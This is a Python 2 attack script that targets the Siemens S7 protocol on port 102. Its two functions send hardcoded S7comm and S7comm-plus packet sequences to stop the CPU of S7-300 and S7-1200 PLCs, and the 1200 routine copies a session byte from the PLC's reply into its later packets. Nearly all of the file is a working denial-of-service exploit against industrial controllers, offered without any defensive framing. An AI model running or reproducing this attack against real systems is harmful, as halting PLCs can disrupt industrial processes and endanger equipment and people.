
# -*- coding:utf-8 -*-
'''
针对S7协议漏洞XX
'''
import socket   #for sockets
import sys  #for exit
import time



def Atk6(targetIP):
    print u'****Siemens_s7-300停CPU****'
    IP = targetIP
    port = 102
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((IP , port))
    except socket.error, msg:
        print 'Failed to create socket. Error code: ' + str(msg[0]) + ' , Error message : ' + msg[1]
        sys.exit()

    print 'Socket Connected to ' + IP

    stop_cpu_pkt = [
                "\x03\x00\x00\x16\x11\xe0\x00\x00"+
                "\x00\x01\x00\xc1\x02\x01\x00\xc2"+
                "\x02\x01\x02\xc0\x01\x09",

                "\x03\x00\x00\x19\x02\xf0\x80\x32"+
                "\x01\x00\x00\xff\xff\x00\x08\x00"+
                "\x00\xf0\x00\x00\x01\x00\x01\x03"+
                "\xc0",

                "\x03\x00\x00\x1f\x02\xf0\x80\x32"+
                "\x01\x00\x00\x00\x00\x00\x0e\x00"+
                "\x00\x04\x01\x12\x0a\x10\x02\x00"+
                "\x40\x00\x01\x84\x00\x00\x00",

                "\x03\x00\x00\x1f\x02\xf0\x80\x32"+
                "\x01\x00\x00\x00\x01\x00\x0e\x00"+
                "\x00\x04\x01\x12\x0a\x10\x02\x00"+
                "\x10\x00\x00\x83\x00\x00\x00",

                "\x03\x00\x00\x21\x02\xf0\x80\x32"+
                "\x01\x00\x00\x00\x02\x00\x10\x00"+
                "\x00\x29\x00\x00\x00\x00\x00\x09"+
                "\x50\x5f\x50\x52\x4f\x47\x52\x41"+
                "\x4d",

                "\x03\x00\x00\x1f\x02\xf0\x80\x32"+
                "\x01\x00\x00\x00\x01\x00\x0e\x00"+
                "\x00\x04\x01\x12\x0a\x10\x02\x00"+
                "\x10\x00\x00\x83\x00\x00\x00",

                "\x03\x00\x00\x1f\x02\xf0\x80\x32"+
                "\x01\x00\x00\x00\x01\x00\x0e\x00"+
                "\x00\x04\x01\x12\x0a\x10\x02\x00"+
                "\x10\x00\x00\x83\x00\x00\x00",

                "\x03\x00\x00\x1f\x02\xf0\x80\x32"+
                "\x01\x00\x00\x00\x01\x00\x0e\x00"+
                "\x00\x04\x01\x12\x0a\x10\x02\x00"+
                "\x10\x00\x00\x83\x00\x00\x00",

                "\x03\x00\x00\x1f\x02\xf0\x80\x32"+
                "\x01\x00\x00\x00\x01\x00\x0e\x00"+
                "\x00\x04\x01\x12\x0a\x10\x02\x00"+
                "\x10\x00\x00\x83\x00\x00\x00",

                "\x03\x00\x00\x1f\x02\xf0\x80\x32"+
                "\x01\x00\x00\x00\x01\x00\x0e\x00"+
                "\x00\x04\x01\x12\x0a\x10\x02\x00"+
                "\x10\x00\x00\x83\x00\x00\x00",

                "\x03\x00\x00\x1f\x02\xf0\x80\x32"+
                "\x01\x00\x00\x00\x01\x00\x0e\x00"+
                "\x00\x04\x01\x12\x0a\x10\x02\x00"+
                "\x10\x00\x00\x83\x00\x00\x00",

                "\x03\x00\x00\x1f\x02\xf0\x80\x32"+
                "\x01\x00\x00\x00\x01\x00\x0e\x00"+
                "\x00\x04\x01\x12\x0a\x10\x02\x00"+
                "\x10\x00\x00\x83\x00\x00\x00",

                "\x03\x00\x00\x1f\x02\xf0\x80\x32"+
                "\x01\x00\x00\x00\x01\x00\x0e\x00"+
                "\x00\x04\x01\x12\x0a\x10\x02\x00"+
                "\x10\x00\x00\x83\x00\x00\x00"
                ]

    for i in stop_cpu_pkt:
        s.sendall(i)
        print i.encode('hex')
        time.sleep(0.3)
    s.close()
    print u"发送完毕！"



def Atk32(targetIP):
    print u'****Siemens1200_停CPU****'
    IP = targetIP
    port = 102
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((IP , port))
    except socket.error, msg:
        print 'Failed to create socket. Error code: ' + str(msg[0]) + ' , Error message : ' + msg[1]
        sys.exit()
    print 'Socket Connected to ' + IP

    packet2="\x03\x00\x00\x77\x02\xf0\x80\x72\x02\x00\x68\x31\x00\x00\x05\x42\x00\x00\x00\x03\x00\x00\x03\xa4\x34\x00\x00\x03\xa4\x01\x01\x82\x32\x01\x00\x17\x00\x00\x01\x3a\x82\x3b\x00\x04\x81\x40\x82\x3c\x00\x04\x81\x40\x82\x3d\x00\x04\x00\x82\x3e\x00\x04\x84\x80\xc0\x40\x82\x3f\x00\x15\x00\x82\x40\x00\x15\x05\x32\x3b\x32\x38\x30\x82\x41\x00\x03\x00\x03\x00\x00\x00\x00\x04\xe8\x89\x69\x00\x12\x00\x00\x00\x00\x89\x6a\x00\x13\x00\x89\x6b\x00\x04\x00\x00\x00\x00\x00\x00\x72\x02\x00\x00"
    # dua tren TIA portal thay cho hello plc
    sendstr1 = "\x03\x00\x00\x23\x1e\xe0\x00\x00\x00\x06\x00\xc1\x02\x06\x00\xc2\x0f\x53\x49\x4d\x41\x54\x49\x43\x2d\x52\x4f\x4f\x54\x2d\x45\x53\xc0\x01\x0a"
    s.send(sendstr1)
    s.recv(1024)
    time.sleep(0.05)

    ##session debug
    sendstr2 = "\x03\x00\x00\xc0\x02\xf0\x80\x72\x01\x00\xb1\x31\x00\x00\x04\xca\x00\x00\x00\x02\x00\x00\x01\x20\x36\x00\x00\x01\x1d\x00\x04\x00\x00\x00\x00\x00\xa1\x00\x00\x00\xd3\x82\x1f\x00\x00\xa3\x81\x69\x00\x15\x16\x53\x65\x72\x76\x65\x72\x53\x65\x73\x73\x69\x6f\x6e\x5f\x43\x43\x39\x43\x33\x39\x33\x44\xa3\x82\x21\x00\x15\x0b\x31\x3a\x3a\x3a\x36\x2e\x30\x3a\x3a\x3a\x12\xa3\x82\x28\x00\x15\x0d\x4f\x4d\x53\x2b\x20\x44\x65\x62\x75\x67\x67\x65\x72\xa3\x82\x29\x00\x15\x00\xa3\x82\x2a\x00\x15\x00\xa3\x82\x2b\x00\x04\x84\x80\x80\x80\x00\xa3\x82\x2c\x00\x12\x11\xe1\xa3\x00\xa3\x82\x2d\x00\x15\x00\xa1\x00\x00\x00\xd3\x81\x7f\x00\x00\xa3\x81\x69\x00\x15\x15\x53\x75\x62\x73\x63\x72\x69\x70\x74\x69\x6f\x6e\x43\x6f\x6e\x74\x61\x69\x6e\x65\x72\xa2\xa2\x00\x00\x00\x00\x72\x01\x00\x00"
    s.send(sendstr2)
    time.sleep(1)
    dt = s.recv(1024)##getdata[24]
    src = ord(dt[24])|128

    sendhello = "\x03\x00\x00\x07\x02\xf0\x00"
    s.send(sendhello)
    ##first
    sendstr3 = packet2
    sendstr3 = sendstr3[:23] + chr(src) + sendstr3[24:]
    sendstr3 = sendstr3[:28] + chr(src) + sendstr3[29:]
    if (dt[112] == '\x35')and(dt[113] == '\x34')and(dt[114] == '\x34')and(dt[115] == '\x82')and(dt[116] == '\x41'):
        sendstr3[77] = dt[112]
        sendstr3[78] = dt[113]
        sendstr3[79] = dt[114]
        sendstr3[80] = dt[115]
        sendstr3[81] = dt[116]
        s.send(sendstr3)
        print "dt"
    sendstr4 = "\x03\x00\x00\x77\x02\xf0\x80\x72\x02\x00\x68\x31\x00\x00\x05\x42\x00\x00\x00\x03\x00\x00\x03\xa4\x34\x00\x00\x03\xa4\x01\x01\x82\x32\x01\x00\x17\x00\x00\x01\x3a\x82\x3b\x00\x04\x81\x40\x82\x3c\x00\x04\x81\x40\x82\x3d\x00\x04\x00\x82\x3e\x00\x04\x84\x80\xc0\x40\x82\x3f\x00\x15\x00\x82\x40\x00\x15\x05\x32\x3b\x32\x38\x30\x82\x41\x00\x03\x00\x03\x00\x00\x00\x00\x04\xe8\x89\x69\x00\x12\x00\x00\x00\x00\x89\x6a\x00\x13\x00\x89\x6b\x00\x04\x00\x00\x00\x00\x00\x00\x72\x02\x00\x00"
    sendstr4 = sendstr4[:23] + chr(src) + sendstr4[24:]
    s.send(sendstr4)
    time.sleep(0.5)

    s.send(sendhello)
    sendstr5 = "\x03\x00\x00\x43\x02\xf0\x80\x72\x02\x00\x34\x31\x00\x00\x04\xf2\x00\x00\x00\x08\x00\x00\x03\xff\x36\x00\x00\x00\x34\x01\x90\x77\x00\x08\x01\x00\x00\x04\xe8\x89\x69\x00\x12\x00\x00\x00\x00\x89\x6a\x00\x13\x00\x89\x6b\x00\x04\x00\x00\x00\x00\x00\x00\x00\x72\x02\x00\x00"
    sendstr5 = sendstr5[:23] + chr(src) + sendstr5[24:]
    s.send(sendstr5)
    time.sleep(0.5)
    print u"CPU停止运行"
    s.close()




